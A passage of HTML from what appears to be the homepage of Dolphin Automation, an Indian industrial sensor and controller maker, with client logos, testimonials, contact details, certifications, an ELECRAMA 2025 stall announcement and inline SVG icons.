                          <img src="assets/imgs/logo/Frame 192.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>

                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 193.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>


                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 194.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>

                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 195 (1).png" alt="" srcset="" width="100%"
                            class="city-img-logo">
                        </div>

                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 196.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>

                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 197.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>

                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 327.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>

                      </div>
                      <div class="swiper-button-next slider-btns" style="color:black"></div>
                      <div class="swiper-button-prev slider-btns" style="color:black"></div>

                    </div>
                  </div>
                  <h1 class="text-center py-2 city-text text-uppercase">
                    OUR MAJOR ESTEEMED CLIENTS
                  </h1>
                  <div class="container-fluid" width="100%">
                    <div class="swiper mySwiper">
                      <div class="swiper-wrapper">
                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 174.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>
                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 175.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>
                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 176.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>
                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 177.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>
                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 178.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>
                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 179.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>
                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 180.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>
                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 181.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>
                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 182.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>

                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 183.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>

                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 198.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>

                        <div class="swiper-slide client-logos">
                          <img src="assets/imgs/logo/Frame 199.png" alt="" srcset="" width="100%" class="city-img-logo">
                        </div>

                      </div>
                      <div class="swiper-button-next slider-btns" style="color:black"></div>
                      <div class="swiper-button-prev slider-btns" style="color:black"></div>

                    </div>
                  </div>
                </div>

              </div>
          </div>
          <!--WHAT MAKES DOLPHIN DIFFERENT-->
          <div class=" different">
            <div>
              <div class="justify-content-center">
                <h2 class="pt-4 text-center">What makes Dolphin Automation different?</h1>
                  <p class="container">
                    We prioritize the highest standards of quality in all our automation products, from sensors to
                    control units. Our state-of-the-art manufacturing facilities ensure that every product is built to
                    last and perform reliably, giving customers peace of mind.
                  </p>
              </div>


              <div class="row g-2 justify-content-center">


                <div class="col-lg-5 c-blue">
                  <img src="assets/imgs/icons/i1.jpg" alt="" />
                  <h6 class="diff-links">
                    Dolphin Automation offers high-quality automation products and sensors to customers worldwide. Our
                    products are trusted for their durability and reliability, making us a preferred choice in the
                    global market.
                  </h6>
                </div>
                <div class="col-lg-5 c-grey">
                  <img src="assets/imgs/icons/i2.jpg" alt="" />
                  <h6 class="diff-links">
                    We deliver top-tier automation solutions at the most competitive prices. By optimizing our
                    manufacturing processes, we ensure our customers get premium products without breaking their
                    budgets.
                  </h6>
                </div>


                <div class="col-lg-5 c-grey">
                  <img src="assets/imgs/icons/i5.jpg" alt="" />
                  <h6 class="diff-links">
                    With cutting-edge machinery and research facilities, Dolphin Automation ensures that every product
                    reflects the latest advancements in automation technology.
                  </h6>
                </div>
                <div class="col-lg-5 c-blue">
                  <img src="assets/imgs/icons/i6.jpg" alt="" />
                  <h6 class="diff-links">
                    By leveraging sophisticated technology and streamlined manufacturing processes, we produce
                    high-performance products that enhance operational efficiency for our customers.
                  </h6>
                </div>

                <div class="col-lg-5 c-blue">
                  <img src="assets/imgs/icons/i6.jpg" alt="" />
                  <h6 class="diff-links">
                    We maintain strict quality standards across all stages of manufacturing, ensuring every product
                    meets or exceeds industry expectations.
                  </h6>
                </div>

                <div class="col-lg-5 c-grey">
                  <img src="assets/imgs/icons/i6.jpg" alt="" />
                  <h6 class="diff-links">
                    Our extensive manufacturing facilities allow us to meet large orders efficiently and maintain
                    competitiveness in the global market.
                  </h6>
                </div>
                <div class="col-lg-5 c-grey">
                  <img src="assets/imgs/icons/i6.jpg" alt="" />
                  <h6 class="diff-links">
                    Sustainability Commitment –We Focus on eco-friendly practices to reduce environmental impact.
                  </h6>
                </div>
                <div class="col-lg-5 c-blue">
                  <img src="assets/imgs/icons/i6.jpg" alt="" />
                  <h6 class="diff-links">
                    Knowledgeable customer service and technical support for seamless integration and troubleshooting.
                  </h6>
                </div>

              </div>
            </div>
          </div>



          <!--TESTIMONIALS-->
          <div>
            <div class="container-fluid pt-2 pb-4">
              <h2 class="text-center py-1 m-title">Testimonials</h3>
                <div class="row g-0" style="gap: 15px;justify-content: center;">

                  <div class="col-lg-5 box-shadow p-3 mx-0">
                    <div>
                      <span><img src="assets/imgs/creatives2/quotes-1.png" alt="" /></span>
                      <p>

                        I am really happy with the top-level quality and efficiency of the humidity controllers provided
                        by Dolphin Automation. The product quality, service support, delivery experience, and pricing
                        were exceptional.
                        Their high-quality
                        products hold up very well. I would love to recommend the products and services of Dolphin
                        Automation.
                      </p>
                    </div>
                    <div class=" align-items-center">
                      <div>
                        <ul class="star-ul d-flex">
                          <li><i class="fa-solid fa-star" style="color: #FFD43B;"></i></li>
                          <li><i class="fa-solid fa-star" style="color: #FFD43B;"></i></li>
                          <li><i class="fa-solid fa-star" style="color: #FFD43B;"></i></li>
                          <li><i class="fa-solid fa-star" style="color: #FFD43B;"></i></li>
                          <li><i class="fa-solid fa-star" style="color: #FFD43B;"></i></li>
                        </ul>
                      </div>
                      <div>
                        <p>Dhruv Sharma</p>
                      </div>
                    </div>
                  </div>
                  <div class="col-lg-5 box-shadow p-3">
                    <div>
                      <span><img src="assets/imgs/creatives2/quotes-1.png" alt="" /></span>
                      <p>
                        Thank you for providing the best products at the most economical rates.
                        I highly appreciate the hard work of the team of Dolphin Automation in providing the finest
                        quality products like Pid Controllers, Sensors, and load controllers. I hope to
                        have the opportunity to work with your organization again in the near future.

                      </p>
                    </div>
                    <div class=" align-items-center">
                      <div>
                        <ul class="star-ul d-flex">
                          <li><i class="fa-solid fa-star" style="color: #FFD43B;"></i></li>
                          <li><i class="fa-solid fa-star" style="color: #FFD43B;"></i></li>
                          <li><i class="fa-solid fa-star" style="color: #FFD43B;"></i></li>
                          <li><i class="fa-solid fa-star" style="color: #FFD43B;"></i></li>
                          <li><i class="fa-solid fa-star" style="color: #FFD43B;"></i></li>
                        </ul>
                      </div>
                      <div>
                        <p class="align-items-center">Radhika Mishra</p>
                      </div>
                    </div>
                  </div>

                  <div class="col-lg-5 box-shadow p-3">
                    <div>
                      <span><img src="assets/imgs/creatives2/quotes-1.png" alt="" /></span>
                      <p>
                        I am highly impressed by the temperature controllers provided by Dolphin Automation.
                        They are a reliable product and so far it has been working great for the past six months.
                        It was very convenient to set up and use the controllers.
                        I would definitely recommend the products of your company.

                      </p>
                    </div>
                    <div class=" align-items-center">
                      <div>
                        <ul class="star-ul d-flex">
                          <li><i class="fa-solid fa-star" style="color: #FFD43B;"></i></li>
                          <li><i class="fa-solid fa-star" style="color: #FFD43B;"></i></li>
                          <li><i class="fa-solid fa-star" style="color: #FFD43B;"></i></li>
                          <li><i class="fa-solid fa-star" style="color: #FFD43B;"></i></li>
                          <li><i class="fa-solid fa-star" style="color: #FFD43B;"></i></li>
                        </ul>
                      </div>
                      <div>
                        <p class="align-items-center">Siya Thapar</p>
                      </div>
                    </div>
                  </div>




                  <div class="col-lg-5 box-shadow p-3">
                    <div>
                      <span><img src="assets/imgs/creatives2/quotes-1.png" alt="" /></span>
                      <p>
                        I’m extremely satisfied with the Inductive Proximity Sensors from Dolphin Automation. These
                        sensors have been highly reliable and accurate in detecting metal objects in our manufacturing
                        process. Installation was straightforward, and they've been performing flawlessly for over a
                        year. I’d gladly recommend these sensors to anyone looking for dependable automation solutions.

                      </p>
                    </div>
                    <div class=" align-items-center">
                      <div>
                        <ul class="star-ul d-flex">
                          <li><i class="fa-solid fa-star" style="color: #FFD43B;"></i></li>
                          <li><i class="fa-solid fa-star" style="color: #FFD43B;"></i></li>
                          <li><i class="fa-solid fa-star" style="color: #FFD43B;"></i></li>
                          <li><i class="fa-solid fa-star" style="color: #FFD43B;"></i></li>
                          <li><i class="fa-solid fa-star" style="color: #FFD43B;"></i></li>
                        </ul>
                      </div>
                      <div>
                        <p class="align-items-center">Ram Sharma</p>
                      </div>
                    </div>
                  </div>


                </div>
            </div>
          </div>
          <!--WHY CHOOSE US-->
          <div>
            <!--=========== why choose us ================-->
            <section class="whychoose-ussection overflow-hidden mb-5">
              <div class="container overflow-hidden">

                <div class="row d-flex">
                  <div class="col-lg-5 col-md-5">
                    <div style="height: 100%;">
                      <div class="why-chooseeee45">

                        <div class="common-headings1">
                          <h2 class="fw-bold" style="color: #fff;">Why Choose Us</h3>
                        </div>

                        <div class="py-1">
                          <p class="textwhite font-size4" style="color: white !important;"> Dolphin Automation is a
                            rapidly growing organization established with a vision to offer the best quality automation
                            products and reliable sensors to customers across the globe. Our durable and dependable
                            products are available at
                            the most competitive prices.
                          </p>
                        </div>
                        <div class="py-1">
                          <div class="contact-in">
                            <p> <i class="fa-solid fa-envelope"></i></p>
                            <a href="dolphinautomation9@gmail.com">
                              dolphinautomation9@gmail.com</a>
                          </div>

                          <div class="contact-in">
                            <p> <i class="fa-solid fa-phone"></i></p>
                            <a href="tel:09711616473">+91 9810879611</a>
                          
                          </div>
                          <div class="contact-in ">
                            <p> <i class="fa-solid fa-street-view"></i></p>
                            <a href="#" style="text-decoration: none;" class="">
                              A2/86, SITE - V (NEAR KASNA)
                              UPSIDC, GREATER NOIDA - 201308

                            </a>
                          </div>



                        </div>
                      </div>

                    </div>
                  </div>

                  <div class="col-lg-7 col-md-7">
                    <div class="why-choose-content row">
                      <div class="col-lg-12 col-md-12">
                        <div class="content-points">
                          <div>
                            <p><i class="fa-solid fa-check"></i></p>
                            <h5 class="mb-0">Committed to Quality</h5>
                          </div>
                        </div>
                      </div>
                      <div class="col-lg-12 col-md-12">
                        <div class="content-points">
                          <div>
                            <p><i class="fa-solid fa-check"></i></p>
                            <h5 class="mb-0">Customer satisfaction is our prime objective.</h5>
                          </div>
                        </div>
                      </div>
                      <div class="col-lg-12 col-md-12">
                        <div class="content-points">
                          <div>
                            <p><i class="fa-solid fa-check"></i></p>
                            <h5 class="mb-0">The company owns well equipped manufacturing and research facilities. </h5>
                          </div>
                        </div>
                      </div>
                      <div class="col-lg-12 col-md-12">
                        <div class="content-points">
                          <div>
                            <p><i class="fa-solid fa-check"></i></p>
                            <h5 class="mb-0">Our durable and dependable products are available at
                              the most competitive prices.</h5>
                          </div>
                        </div>
                      </div>


                      <div class="col-lg-12 col-md-12">
                        <div class="content-points">
                          <div>
                            <p><i class="fa-solid fa-check"></i></p>
                            <h5 class="mb-0">A large scale manufacturing capability has helped us establish our
                              competitiveness in
                              the global market</h5>
                          </div>
                        </div>
                      </div>




                    </div>
                  </div>
                </div>
              </div>
            </section>

          </div>

          <!--CERTIFICATE-->
          <div>


            <div class="container-fluid">
            <div class="">
                  <div  class=" text-center">
                    <h1 style="width:100%;color: #F58220;">OUR
                      CERTIFICATIONS</h1>
                    <p style="display:block;width:100%;color: #222222;text-align:center;"><i> Certified in Cutting-Edge
                        Automation Solutions"</i></p>

                  </div>
                </div>
              <div class="row ">
               
                <div class="col-lg-3 certificate">
                  <img src="assets/imgs/certificates/DOLPHIN AUTOMATION  - EAS - CE.jpg" alt="" width="100%"
                    class="c-img" />
                  <a href="assets/imgs/certificates/certificate2.pdf" class="a-certificate">Download now <span><i
                        class="fa-solid fa-download"></i></span></a>
                </div>
                <div class="col-lg-3 certificate ">
                  <img src="assets/imgs/certificates/DOLPHIN AUTOMATION -  QMS - EAS.jpg" alt="" width="100%"
                    class="c-img">
                  <a href="assets/imgs/certificates/certificate1.pdf" class="a-certificate">Download now <span><i
                        class="fa-solid fa-download"></i></span></a>
                </div>

                <div class="col-lg-3 certificate mb-2">
                  <img src="assets/imgs/certificates/cert-ficate.png" alt="" width="100%"
                    class="c-img">
                  <a href="assets/imgs/certificates/DA  BRAND CERTIFICATE.pdf" class="a-certificate">Download now <span><i
                        class="fa-solid fa-download"></i></span></a>
                </div>

                <div class="col-lg-3 certificate mb-2">
                  <img src="assets/imgs/certificates/certificate-1.png" alt="" width="100%"
                    class="c-img">
                  <a href="assets/imgs/certificates/DOLPHIN BRAND CERTIFICATE.pdf" class="a-certificate">Download now <span><i
                        class="fa-solid fa-download"></i></span></a>
                </div>

              </div>
            </div>
          </div>
          <!---EXHIBITION 1-->
          <!-- <section>
            <div class="bgset18">
              <div class="bg-shadow">
                <h5>welcome</h5>
                <h3>DOLPHIN AUTOMATION EXHIBITION</h3>
                <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Sapiente voluptas veritatis ad quis vitae
                  atque reiciendis illum recusandae laudantium iusto consectetur iste consequuntur nihil cum incidunt,
                  neque exercitationem deserunt pariatur. Ducimus reprehenderit veritatis eius assumenda iste totam
                  animi tempore temporibus repudiandae fuga voluptas amet necessitatibus sit, impedit dicta. Minima,
                  molestias?
                  Lorem ipsum dolor sit amet consectetur adipisicing elit. Asperiores quas sit tempora consequuntur
                  dolorum provident odio inventore quasi iste distinctio! Facere, incidunt ipsa blanditiis officiis ut
                  inventore ducimus maiores asperiores soluta dolorum assumenda quibusdam neque quisquam. Modi iste et
                  quaerat voluptatem qui architecto facere necessitatibus, aliquam vitae libero possimus ullam!

                  Lorem ipsum dolor sit amet consectetur adipisicing elit. Eos voluptatem, ex aliquid harum aspernatur
                  molestiae dolore fugiat rem totam eveniet voluptas illum eum ab delectus nesciunt sunt non in quae!
                  Neque et delectus pariatur unde sequi in debitis porro odio omnis, quam accusantium doloribus aperiam
                  deserunt placeat magnam nobis hic?</p>
              </div>
            </div>
          </section>-->
          <!--EXHIBITION-->
          <section>
            <div class="container-fluid py-3 exb-bg">

              <h4 class="text-center">Event: <b>Dolphin Automation </b>at ELECRAMA 2025</h4>
              <p>

                Dolphin Automation, a leading name in the production of advanced automation products, is excited to
                announce its participation in ELECRAMA 2025, the premier global event for the electrical and automation
                industry. This year, ELECRAMA will take place from 22nd to 26th February 2025 at the India Exposition
                Mart, Greater Noida, Delhi NCR, India.

                As a company specializing in automation solutions, Dolphin Automation is set to showcase its latest
                innovations, technologies, and products designed to optimize industrial processes and improve
                operational
                efficiency. The company’s products cater a wide range of sectors, including manufacturing, energy,
                infrastructure, and more.

              <h6> Dolphin Automation at ELECRAMA 2025:</h6>
              <ul>
                <li>Dates: 22nd – 26th February 2025</li>
                <li>Venue: India Exposition Mart, Greater Noida, Delhi NCR, India</li>
                <li> Hall: 9-12</li>
                <li>Stall Number: H9-B21</li>
              </ul>
              We invite you to visit Stall H9-B21 in Hall 9-12 to experience the cutting-edge automation
              solutions that Dolphin Automation has to offer. Whether you're looking to enhance your manufacturing
              processes, improve system efficiency, or explore new automation technologies, our experts will be
              available to guide you through our product offerings and provide tailored solutions to meet your business
              needs.

              Don't miss the opportunity to connect with industry leaders, exchange ideas, and discover how Dolphin
              Automation can help elevate your business to the next level.
              </p>

           
            </div>



            <div class="container-fluid py-2 stall-f">
              <div class="row">
                <div class="col-lg-3 text-center justify-content-center align-items-center">
                  <h4> Why Visit Dolphin Automation's Stall?</h4>
                </div>
                <div class="col-lg-9">
                  <div class="">
                    <div class="row g-2">
                      <div class="col-lg-5 stall-1 mx-2">Get an exclusive look at our innovative automation products and
                        solutions.</div>
                      <div class="col-lg-5 stall-2 mx-2">Discover how our technology can optimize your operations and
                        improve productivity.</div>
                      <div class="col-lg-5 stall-2 mx-2">Meet our experts for live demonstrations, consultations, and
                        product insights.</div>
                      <div class="col-lg-5 stall-1 mx-2">Experience the benefits of smart automation tailored to your
                        industry’s needs.</div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </section>



          <!--SOLUTIONS-->
          <div class="container-fluid sol-out py-2">
            <div class="container sol-in">
              <div>
                <h6>SOLUTIONS</h6>
                <h2>We're Dedicated to
                  Provide Quality Solution</h2>
                <p>Dolphin Automation offers a wide range of high-quality automation products, including advanced
                  control systems, industrial sensors, and other automation solutions. Our products are designed to
                  optimize efficiency and reliability in various industries worldwide.</p>
              </div>
              <div class="container">
                <div class="row">
                  <div class="col-lg-3 col-6">
                    <img src="assets/imgs/icons/1 (1).png" alt="" width="100%">
                    <div class="text-center">
                      <h4>Reliability</h4>
                      <h6>Transparency Service</h6>
                    </div>
                  </div>
                  <div class="col-lg-3 col-6">
                    <img src="assets/imgs/icons/2.png" alt="" width="100%">
                    <div class="text-center">
                      <h4>Access your data</h4>
                      <h6>anywhere anytime</h6>
                    </div>
                  </div>
                  <div class="col-lg-3 col-6">
                    <img src="assets/imgs/icons/3.png" alt="" width="100%">
                    <div class="text-center">
                      <h4>Security</h4>
                      <h6>You can trust</h6>
                    </div>
                  </div>
                  <div class="col-lg-3 col-6">
                    <img src="assets/imgs/icons/4.png" alt="" width="100%">
                    <div class="text-center">
                      <h4> Dashboard</h4>
                      <h6>Monitor live data</h6>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <!--SOURCE OF INDUSTRIAL SOURCES-->
          <div class="in-bg">
            <div class="container-fluid py-0 i-bg my-0">
              <div class="row">
                <div class="col-lg-4 mr-2">
                  <img src="assets/imgs/new banners/laptop/post (2).png" alt="" width="90%" class=" pt-0 mt-2">
                </div>
                <div class="col-lg-8 justify-content-center py-2">
                  <h3> SOURCE OF INDUSTRIAL SUPPLIES</h3>
                  <p>
                    Dolphin Automation is a rapidly expanding company focused on providing high-quality industrial
                    automation products and reliable sensors to customers worldwide. We specialize in manufacturing a
                    broad range of automation components, including inductive proximity sensors, photoelectric sensors,
                    capacitive sensors, solid state relays, SMPS (Switched-Mode Power Supplies), and process
                    controllers. These products are known for their durability, dependability, and competitive pricing.

                    The company prides itself on its large-scale manufacturing capabilities, cutting-edge research
                    facilities, and state-of-the-art technology. This allows us to produce precise and efficient
                    products for various industrial applications, such as process control, measurement etc..
                  </p>
                </div>
              </div>
            </div>
          </div>


          <!--3 block section-->
          <section>
            <div class=" py-0">
              <div class="row">
                <div class="col-lg-4 d-flex py-2 s1">
                  <div class="p-2">
                    <span><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
                        class="icon" viewBox="0 0 1024 1024" width="64" height="64">
                        <defs>
                          <style type="text/css">
                            @font-face {
                              font-family: feedback-iconfont;
                              src: url("//at.alicdn.com/t/font_1031158_u69w8yhxdu.woff2?t=1630033759944") format("woff2"), url("//at.alicdn.com/t/font_1031158_u69w8yhxdu.woff?t=1630033759944") format("woff"), url("//at.alicdn.com/t/font_1031158_u69w8yhxdu.ttf?t=1630033759944") format("truetype");
                            }
                          </style>
                        </defs>
                        <path
                          d="M281.674 253.424c11.553-14.585 24.288-28.14 38.208-40.267l-68.978-69.013c-10.828-10.867-28.404-10.867-39.275 0-10.831 10.831-10.831 28.404 0 39.235l70.046 70.043zM506.013 142.469c0.268 0 0.494 0 0.802 0 9.109 0 18.109 0.571 26.955 1.487l0-93.986c0-15.327-12.432-27.757-27.76-27.757s-27.721 12.429-27.721 27.757l0 93.968c8.846-0.895 17.842-1.469 26.956-1.469 0.27 0 0.534 0 0.762 0zM730.414 253.388l69.971-70.007c10.866-10.831 10.866-28.404 0-39.235-10.794-10.867-28.405-10.867-39.277 0l-69.018 69.013c13.958 12.123 26.695 25.664 38.324 40.227zM213.494 450.225c0-13.403 1.07-26.519 2.633-39.483l-98.682 0c-15.289 0-27.722 12.432-27.722 27.757 0 15.328 12.434 27.757 27.722 27.757l96.393 0c-0.229-5.28-0.345-10.581-0.345-16.033zM894.563 410.745l-98.643 0c1.6 12.964 2.633 26.082 2.633 39.483 0 5.45-0.115 10.753-0.305 16.033l96.315 0c15.332 0 27.722-12.429 27.722-27.757s-12.39-27.757-27.722-27.757zM745.017 638.262c-11.286 16.547-23.218 30.843-34.695 43.77l50.787 50.829c10.868 10.831 28.483 10.831 39.277 0 10.866-10.867 10.866-28.404 0-39.275l-55.37-55.324zM211.627 693.585c-10.831 10.867-10.831 28.404 0 39.275 10.868 10.831 28.448 10.831 39.275 0l50.83-50.863c-11.475-12.889-23.412-27.222-34.699-43.731l-55.403 55.324zM760.039 450.225c0.037-57.556-19.138-110.785-51.438-153.414-28.33-37.442-66.806-66.802-111.379-84.036l0.229-1.222-19.026-5.586c-14.798-4.29-30.051-7.265-45.605-8.867l-2.211-0.246-0.075 0-0.079-0.019c-7.623-0.724-15.557-1.279-23.83-1.279l-1.218 0c-8.276 0-16.207 0.557-23.833 1.279l-0.115 0.019-2.286 0.246c-15.535 1.6-30.791 4.575-45.549 8.867l-18.416 5.374 0.19 1.222c-44.802 17.214-83.505 46.651-111.99 84.244-32.258 42.628-51.438 95.854-51.438 153.414 0 41.274 7.132 75.207 18.227 103.29 16.661 42.114 42.094 70.559 62.533 92.138 10.22 10.754 19.22 19.941 25.317 27.795 6.254 7.892 9.265 13.995 10.141 18.837 4.459 23.565 4.917 53.306 4.917 60.854l0 2.174c0 34.085 27.609 61.617 61.659 61.655l142.51 0c34.092-0.037 61.659-27.609 61.659-61.655l0-2.097c-0.037-7.474 0.458-37.291 4.919-60.893 0.608-3.278 2.058-7.017 4.917-11.591 4.88-7.97 14.11-17.883 25.548-29.819 17.083-17.959 38.815-40.604 56.091-72.805 17.312-32.161 29.703-73.706 29.626-127.882zM701.813 537.676c-13.614 34.336-34.053 57.575-53.763 78.391-9.841 10.411-19.487 20.095-27.911 30.812-8.311 10.562-15.745 22.65-18.606 37.481-5.377 28.94-5.607 59.978-5.638 68.862 0 1.181 0 1.828 0 2.096-0.037 10.295-8.314 18.606-18.608 18.606l-142.51 0c-5.223 0-9.761-2.059-13.194-5.45-3.391-3.434-5.412-7.934-5.412-13.154 0-0.268 0-0.953 0-2.172-0.037-8.957-0.306-39.921-5.682-68.783-1.828-9.797-5.834-18.571-10.674-26.348-8.579-13.612-19.559-24.819-30.889-36.832-17.116-17.842-35.232-37.119-49.341-63.41-14.07-26.309-24.517-59.745-24.557-107.54 0.037-47.947 15.862-91.95 42.706-127.427 26.845-35.442 64.595-62.209 108.175-75.246l5.377-1.638c10.524-2.708 21.315-4.861 32.429-6.026l0.075 0 2.06-0.229c6.519-0.627 12.847-1.03 19.103-1.066l1.105 0.115 1.106-0.076c6.212 0 12.579 0.42 19.063 1.03l-0.079 0 2.137 0.229 0.037 0c11.093 1.163 21.887 3.277 32.372 6.026l5.451 1.638c43.582 13.037 81.329 39.807 108.175 75.246 26.801 35.478 42.666 79.482 42.666 127.427 0.003 36.409-6.094 64.511-15.169 87.446zM532.782 197.107l0.079 0zM479.17 197.107l0 0c0 0 0.037 0 0.075 0l-0.075 0zM576.706 833.825l-141.369 0c-14.604 0-26.499 11.822-26.499 26.539 0 14.564 11.899 26.465 26.499 26.465l141.369 0c14.604 0 26.499-11.899 26.499-26.465 0-14.721-11.899-26.539-26.499-26.539zM576.706 900.704l-141.369 0c-14.604 0-26.499 11.857-26.499 26.464 0 14.678 11.899 26.539 26.499 26.539l141.369 0c14.604 0 26.499-11.857 26.499-26.539 0-14.605-11.899-26.464-26.499-26.464zM518.406 968.116l-72.805 0c0 0.801-0.154 1.561-0.154 2.404 0 14.643 22.498 26.499 43.297 26.499l34.546 0c20.818 0 43.277-11.857 43.277-26.499 0-0.837-0.115-1.6-0.115-2.404l-48.044 0z"
                          fill="#2c2c2c"></path>
                      </svg></span>
                  </div>
                  <div class="p-2">
                    <h4>Creative Ideas</h4>
                    <h6>We are committed to product upgrades and innovation to provide maximum efficiency.</h6>
                  </div>
                </div>
                <div class="col-lg-4 d-flex py-2 s2">
                  <div class="p-2">
                    <span><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
                        class="icon" viewBox="0 0 1024 1024" width="64" height="64">
                        <defs>
                          <style type="text/css">
                            @font-face {
                              font-family: feedback-iconfont;
                              src: url("//at.alicdn.com/t/font_1031158_u69w8yhxdu.woff2?t=1630033759944") format("woff2"), url("//at.alicdn.com/t/font_1031158_u69w8yhxdu.woff?t=1630033759944") format("woff"), url("//at.alicdn.com/t/font_1031158_u69w8yhxdu.ttf?t=1630033759944") format("truetype");
                            }
                          </style>
                        </defs>
                        <path
                          d="M512 1023.999999l-10.871556-4.210371C151.981835 884.837802 111.60626 708.442098 111.60626 587.503896L111.60626 125.588463l31.169316 1.068303c242.693341 8.263639 346.035962-101.268855 347.010003-102.337159L512.031421 0l22.214422 24.319607c0.816938 0.879779 98.755201 102.777048 321.087941 102.777048 0 0 0 0 0.031421 0 8.452163 0 17.092851-0.125683 25.859221-0.43989l31.169316-1.068303 0 461.915434c0 120.938202-40.375575 297.333906-389.522184 432.285731L512 1023.999999zM171.871127 187.361522l0 400.142375c0 65.04081 0.031421 236.754833 340.128873 371.832341 340.128873-135.077508 340.128873-306.791531 340.128873-371.832341L852.128873 187.361522c-188.335563-0.722676-296.705492-67.742989-340.128873-102.368579C468.545198 119.587112 360.175269 186.576005 171.871127 187.361522zM242.064928 537.38791l61.930163-50.178828 123.923166 91.434182c0 0 171.11703-177.024118 336.326971-259.629088l23.596932 26.581896c0 0-206.496717 171.11703-312.698619 398.319975L242.064928 537.38791z"
                          fill="#fff"></path>
                      </svg></span>
                  </div>
                  <div class="p-2">
                    <h4>Quality Assurance</h4>
                    <h6>We attach importance to product quality and strictly control all aspects</h6>
                  </div>
                </div>
                <div class="col-lg-4 d-flex py-2 s3">
                  <div class="p-2">
                    <span><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
                        class="icon" viewBox="0 0 1024 1024" width="64" height="64">
                        <defs>
                          <style type="text/css">
                            @font-face {
                              font-family: feedback-iconfont;
                              src: url("//at.alicdn.com/t/font_1031158_u69w8yhxdu.woff2?t=1630033759944") format("woff2"), url("//at.alicdn.com/t/font_1031158_u69w8yhxdu.woff?t=1630033759944") format("woff"), url("//at.alicdn.com/t/font_1031158_u69w8yhxdu.ttf?t=1630033759944") format("truetype");
                            }
                          </style>
                        </defs>
                        <path
                          d="M598.36416 660.81792c-18.88768 0-31.09376-12.20608-31.09376-31.09376 0-18.8928 12.20608-31.09888 31.09376-31.09888 104.93952 0 178.71872-20.0448 197.37088-53.62176l0.36352-0.73728c4.16256-10.49088 15.15008-17.536 27.80672-17.536 4.31616 0 8.54016 0.80896 12.544 2.41152 7.33184 2.92864 12.928 8.82176 15.77984 16.5888 2.78016 7.57248 2.59072 16.04096-0.53248 23.83872-37.83168 79.43168-168.12032 91.24352-242.42688 91.24352h-10.9056z"
                          fill="#ffffff"></path>
                        <path
                          d="M94.3872 643.15904c-18.8928 0-31.09888-12.20608-31.09888-31.09888V459.30496c0-7.4496 4.5824-16.64512 12.25216-24.59648l0.384-0.39936 23.58784-15.72864 0.13312-2.64192C110.57664 204.5952 283.99616 39.04512 494.45376 39.04512c206.83776 0 380.26752 162.39616 394.81856 369.71008l0.2304 3.34848 50.7392 19.52256c12.43136 3.29216 21.75488 15.51872 21.75488 24.04864v152.7552c0 18.88768-12.20608 31.09376-31.09888 31.09376-18.88768 0-31.09376-12.20608-31.09376-31.09376V481.14176l-50.9696-19.59936c-12.32896-3.21536-21.77024-15.29856-21.77024-27.6992 0-183.3984-149.20704-332.60544-332.60544-332.60544S161.85344 250.44992 161.85344 433.8432c0 10.29632-4.1216 19.79392-12.25216 28.2368l-0.384 0.40448-23.73632 15.82592v133.75488c0 18.88768-12.20608 31.09376-31.09376 31.09376z"
                          fill="#ffffff"></path>
                        <path
